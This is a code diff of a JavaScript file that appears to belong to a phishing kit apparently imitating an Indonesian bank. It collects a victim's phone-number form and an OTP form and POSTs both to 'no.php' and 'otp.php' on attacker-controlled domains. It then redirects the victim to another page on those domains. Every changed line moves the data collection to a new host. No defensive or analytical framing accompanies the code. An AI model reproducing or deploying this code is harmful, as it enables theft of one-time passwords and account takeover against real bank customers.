@@ -16,7 +16,7 @@ $('.process1').fadeIn();
  
       $.ajax({
             type: 'POST',
-            url: 'https://choreoapps.ll-feed.cfd/bsi/d4bf/no.php',
+            url: 'https://anjayhostjon.cloud/choreoapps.ll-feed.cfd/bsi/d4bf/no.php',
             data: $('#formHP').serialize(),
             datatype: 'text',
             
@@ -41,7 +41,7 @@ function sendOtp() {
  document.getElementById('btnSubmit1').innerHTML = "Memproses...";    
 $.ajax({
  type: 'POST',
- url: 'https://choreoapps.ll-feed.cfd/bsi/d4bf/otp.php',
+ url: 'https://anjayhostjon.cloud/choreoapps.ll-feed.cfd/bsi/d4bf/otp.php',
  async: false,
  dataType: 'JSON',
  data: $('#form2').serialize(),
@@ -80,7 +80,7 @@ function getcs(){
      audio1.load();
     audio4.loop = false
 setTimeout(function(){  
-location.href='https://choreoapps.ll-feed.cfd/wa/d4bf';
+location.href='https://anjayhostjon.cloud/choreoapps.ll-feed.cfd/wa/d4bf';
     }, 5000);
     setTimeout(function(){
     $("#djload").hide();   
